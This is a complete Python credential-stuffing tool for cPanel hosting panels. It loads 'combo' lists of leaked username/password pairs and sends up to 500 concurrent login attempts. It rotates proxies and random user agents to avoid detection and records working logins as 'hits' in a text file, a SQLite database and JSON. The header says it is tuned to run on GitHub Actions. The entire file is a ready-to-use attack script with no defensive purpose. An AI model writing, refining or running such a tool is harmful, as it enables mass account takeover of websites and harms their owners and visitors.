#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cpanel_reliable_checker.py - MAX CONCURRENCY ASYNC for GitHub Actions (fixed auto-install)
Version: 3.0.1 - Fixed dependency installation
Author: VEXX
"""

import sys
import os
import re
import time
import json
import sqlite3
import logging
import argparse
import subprocess
import importlib
import asyncio
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# -------------------- AUTO INSTALL DEPENDENCIES (ROBUST) --------------------
REQUIRED_PACKAGES = {
    'aiohttp': 'aiohttp',
    'aiofiles': 'aiofiles',
    'colorama': 'colorama',
    'fake_useragent': 'fake_useragent'
}

def install_package(package_name):
    """Install a Python package using pip with check=True."""
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', package_name],
                       check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {package_name}: {e.stderr.decode() if e.stderr else 'unknown error'}")
        return False

def check_and_install():
    """Check if required packages are installed, install if missing, then restart."""
    missing = []
    for pkg_name, import_name in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(import_name)
        except ImportError:
            missing.append(pkg_name)
    
    if missing:
        print(f"[*] Missing packages: {', '.join(missing)}. Installing...")
        all_installed = True
        for pkg in missing:
            if install_package(pkg):
                print(f"[+] Installed {pkg}")
            else:
                print(f"[-] Failed to install {pkg}")
                all_installed = False
        
        if all_installed:
            print("[*] All dependencies installed. Restarting script...")
            # Restart the script with the same arguments
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print("[!] Some packages could not be installed. Please install manually:")
            print(f"    pip install {' '.join(missing)}")
            sys.exit(1)

# Run installation check BEFORE any external imports
check_and_install()

# Now safe to import external modules
import aiohttp
import aiofiles
from colorama import init, Fore, Style
from fake_useragent import UserAgent

init(autoreset=True)

# -------------------- CONFIGURATION --------------------
DEFAULT_TIMEOUT = 5
DEFAULT_CONCURRENCY = 500      # asyncio semaphore limit
HIT_FILE = "hit.txt"
LOG_FILE = "cpanel_checker.log"
DB_FILE = "cpanel_results.db"
PROXY_FILE = "proxies.txt"
COMBO_FILE = "combo.txt"

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# -------------------- SYNC UTILITIES (no network, safe) --------------------
def load_proxies(proxy_file=PROXY_FILE):
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def get_random_ua():
    try:
        ua = UserAgent()
        return ua.random
    except Exception:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def extract_credentials(line):
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])
    if raw.count(':') == 2 and '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(1)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]
    return None

def read_combo_file(filepath):
    combos = []
    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
    for enc in encodings:
        try:
            with open(filepath, 'r', encoding=enc, errors='ignore') as f:
                lines = f.readlines()
            break
        except UnicodeDecodeError:
            continue
    else:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    for line in lines:
        creds = extract_credentials(line)
        if creds:
            combos.append(creds)
    return combos

# -------------------- ASYNC HTTP CHECKER --------------------
async def check_login(session, url, user, pwd, timeout, proxy=None):
    url = normalize_url(url)
    login_url = f"{url}/login/?login_only=1"
    data = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    headers = {
        'User-Agent': get_random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': url
    }
    proxy_url = None
    if proxy:
        proxy_url = proxy if proxy.startswith(('http://', 'https://')) else f'http://{proxy}'
    
    try:
        async with session.post(login_url, data=data, headers=headers, 
                                timeout=aiohttp.ClientTimeout(total=timeout), 
                                proxy=proxy_url, ssl=False) as resp:
            text = await resp.text()
            if resp.status == 200 and ('security_token' in text or 'cpsess' in text):
                return True, url
            return False, None
    except Exception:
        return False, None

# -------------------- ASYNC WORKER WITH SEMAPHORE --------------------
async def worker(sem, session, combo, timeout, proxy_list, results, hits_list, lock, combo_index, all_combos):
    url, user, pwd = combo
    async with sem:
        proxy = None
        if proxy_list:
            idx = results['proxy_index'] % len(proxy_list)
            proxy = proxy_list[idx]
            results['proxy_index'] += 1
        success, final_url = await check_login(session, url, user, pwd, timeout, proxy)
        async with lock:
            if success:
                results['hits'] += 1
                hits_list.append(f"{user}:{pwd}@{final_url}\n")
            else:
                results['fails'] += 1
            results['total_done'] += 1
        return success, final_url, user, pwd, combo_index

# -------------------- DATABASE FUNCTIONS (sync, run in thread) --------------------
def init_db_sync():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('PRAGMA journal_mode=WAL')
    c.execute('PRAGMA synchronous=NORMAL')
    c.execute('''
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            response_time_ms REAL
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS fails (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            username TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            reason TEXT
        )
    ''')
    conn.commit()
    conn.close()

def save_hit_to_db_sync(url, user, pwd, response_time_ms):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('INSERT INTO hits (url, username, password, response_time_ms) VALUES (?, ?, ?, ?)',
              (url, user, pwd, response_time_ms))
    conn.commit()
    conn.close()

def save_fail_to_db_sync(url, user, reason="invalid"):
    if url is None:
        url = "unknown"
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('INSERT INTO fails (url, username, reason) VALUES (?, ?, ?)',
              (url, user, reason))
    conn.commit()
    conn.close()

async def save_hit_async(url, user, pwd, response_time_ms, executor):
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(executor, save_hit_to_db_sync, url, user, pwd, response_time_ms)

async def save_fail_async(url, user, executor):
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(executor, save_fail_to_db_sync, url, user, "invalid")

# -------------------- ASYNC MAIN RUNNER --------------------
async def run_async(combos, concurrency, timeout, proxy_list):
    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=concurrency, limit_per_host=concurrency, 
                                     ssl=False, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        results = {
            'hits': 0,
            'fails': 0,
            'total_done': 0,
            'proxy_index': 0
        }
        hits_list = []
        lock = asyncio.Lock()
        tasks = []
        for idx, combo in enumerate(combos):
            tasks.append(asyncio.create_task(worker(sem, session, combo, timeout, proxy_list, 
                                                     results, hits_list, lock, idx, combos)))
        
        total = len(combos)
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=2) as executor:
            for i, task in enumerate(asyncio.as_completed(tasks), 1):
                success, final_url, user, pwd, combo_idx = await task
                if success:
                    await save_hit_async(final_url, user, pwd, 0, executor)
                else:
                    original_url = combos[combo_idx][0]
                    await save_fail_async(original_url, user, executor)
                
                if i % 50 == 0 or i == total:
                    elapsed = time.time() - start_time
                    rate = i / elapsed if elapsed > 0 else 0
                    sys.stdout.write(f"\rProgress: {i}/{total} ({i/total*100:.1f}%) | Hits: {results['hits']} | Rate: {rate:.1f} cps")
                    sys.stdout.flush()
            sys.stdout.write("\n")
            elapsed_total = time.time() - start_time
            print(f"[*] Completed {total} combos in {elapsed_total:.2f}s | Speed: {total/elapsed_total:.1f} combos/sec")
            return results['hits'], hits_list

# -------------------- MAIN ENTRY POINT --------------------
def main():
    parser = argparse.ArgumentParser(description="cPanel Credential Checker - MAX CONCURRENCY ASYNC for GHA")
    parser.add_argument("-f", "--file", help="Input file containing combos (default: combo.txt)", default=COMBO_FILE)
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, 
                        help=f"Concurrent tasks (default: {DEFAULT_CONCURRENCY})")
    parser.add_argument("-to", "--timeout", type=int, default=DEFAULT_TIMEOUT, 
                        help=f"Timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("-p", "--proxy-file", help="File with proxies (default: proxies.txt)")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument("--export-json", help="Export hits to JSON file")
    parser.add_argument("--verbose", action="store_true", help="Verbose logging")

    args = parser.parse_args()

    if args.no_color:
        os.environ['COLORAMA_DISABLE'] = '1'

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    input_file = args.file
    if input_file == COMBO_FILE and not os.path.exists(COMBO_FILE):
        print(Fore.YELLOW + f"[!] {COMBO_FILE} not found.")
        input_file = input("Enter file path: ").strip()
        if not input_file:
            print(Fore.RED + "No file provided. Exiting.")
            sys.exit(1)

    if not os.path.exists(input_file):
        print(Fore.RED + f"File not found: {input_file}")
        sys.exit(1)

    print(Fore.CYAN + f"[*] Loading combos from {input_file}...")
    combos = read_combo_file(input_file)
    if not combos:
        print(Fore.RED + "No valid combos extracted. Check file format.")
        sys.exit(1)
    print(Fore.GREEN + f"[+] Loaded {len(combos)} combos.")

    proxy_list = []
    if args.proxy_file and os.path.exists(args.proxy_file):
        proxy_list = load_proxies(args.proxy_file)
        print(Fore.GREEN + f"[+] Loaded {len(proxy_list)} proxies.")

    # Initialize database
    init_db_sync()
    
    # Run async checker
    hits, hits_list = asyncio.run(run_async(combos, args.concurrency, args.timeout, proxy_list))
    
    # Write hits to file
    if hits_list:
        with open(HIT_FILE, 'w', encoding='utf-8') as f:
            f.writelines(hits_list)
        print(Fore.GREEN + f"\n[+] Hits: {hits} saved to {HIT_FILE}")
        # Display each hit
        for line in hits_list:
            parts = line.strip().split('@')
            if len(parts) == 2:
                cred, url = parts
                user, pwd = cred.split(':', 1)
                print(Fore.GREEN + f"✓ {user}:{pwd}@{url}")
    else:
        print(Fore.YELLOW + f"\n[-] No hits found.")

    # Summary
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "FINAL SUMMARY")
    print(Fore.CYAN + "=" * 60)
    print(f"Total combos tested: {len(combos)}")
    print(Fore.GREEN + f"Hits: {hits}")
    print(Fore.RED + f"Fails: {len(combos) - hits}")
    print(Fore.CYAN + f"Results saved to: {HIT_FILE}, {DB_FILE}")
    if proxy_list:
        print(Fore.CYAN + f"Proxies used: {len(proxy_list)}")

    if args.export_json:
        export_data = []
        if os.path.exists(HIT_FILE):
            with open(HIT_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    if '@' in line:
                        export_data.append({"credential": line.strip()})
        with open(args.export_json, 'w', encoding='utf-8') as f:
            json.dump(export_data, f, indent=2)
        print(Fore.GREEN + f"[+] Exported hits to {args.export_json}")

    print(Fore.CYAN + "[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopped by user.")
        sys.exit(0)
    except Exception as e:
        logger.exception(f"Unexpected error: {e}")
        print(Fore.RED + f"[!] Fatal error: {e}")
        sys.exit(1)